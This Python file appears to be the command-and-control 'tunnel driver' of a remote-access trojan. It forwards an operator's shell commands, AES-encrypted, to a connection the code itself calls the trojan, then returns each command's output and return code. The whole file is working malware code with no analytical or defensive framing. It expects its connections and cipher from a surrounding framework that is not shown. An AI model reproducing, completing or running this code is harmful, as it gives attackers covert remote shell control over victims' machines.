DRIVER_CALLS={}

def pack(user_conn,trojan_conn):
	pass

def shell_mode(user_conn,trojan_conn,aes):

	from json import dumps,loads

	command = ['SSHELL',{'cmd':None}]

	while True:
		data = user_conn.recv(1024).decode()
		if data == "[SHELL:MODE]":
			break

		try:
			command[1]['cmd']=data
			enc_command = aes.encrypt(dumps(command).encode())
			trojan_conn.send(enc_command)
			data = trojan_conn.recv(1024*1024)
			stdout_raw = aes.decrypt(data).decode()
			stdout = loads(stdout_raw)
			user_conn.send("{}{}[Return Code: {}]".format(stdout[1],stdout[2],stdout[0]).encode())
		except Exception as e:
			pass

def api_mode(user_conn,trojan_conn,aes):
	while True:
		data = user_conn.recv(1024).decode()
		if data == "[API:MODE]":
			break
		user_conn.send(b"[*] DRIVER API MODE DATA TEST [*]")

def init_driver(user_conn,trojan_conn,aes_cipher,driver_fx_calls):

	while True:
		try:
			cmd = user_conn.recv(1024).decode()
			if cmd == "[KILL:DRIVER]":
				break
			else:
				driver_fx_calls[cmd](user_conn,trojan_conn,aes_cipher)
		except Exception as e:
			user_conn.close()
			trojan_conn.close()
			#print("[!!] Tunnel Driver Exception : {}".format(e))
			break

DRIVER_CALLS.update({"[SHELL:MODE]":shell_mode})
DRIVER_CALLS.update({"[API:MODE]":api_mode})
DRIVER_CALLS.update({"pack":pack})

init_driver(user_tunnel,shell_tunnel,aes_cipher,DRIVER_CALLS)
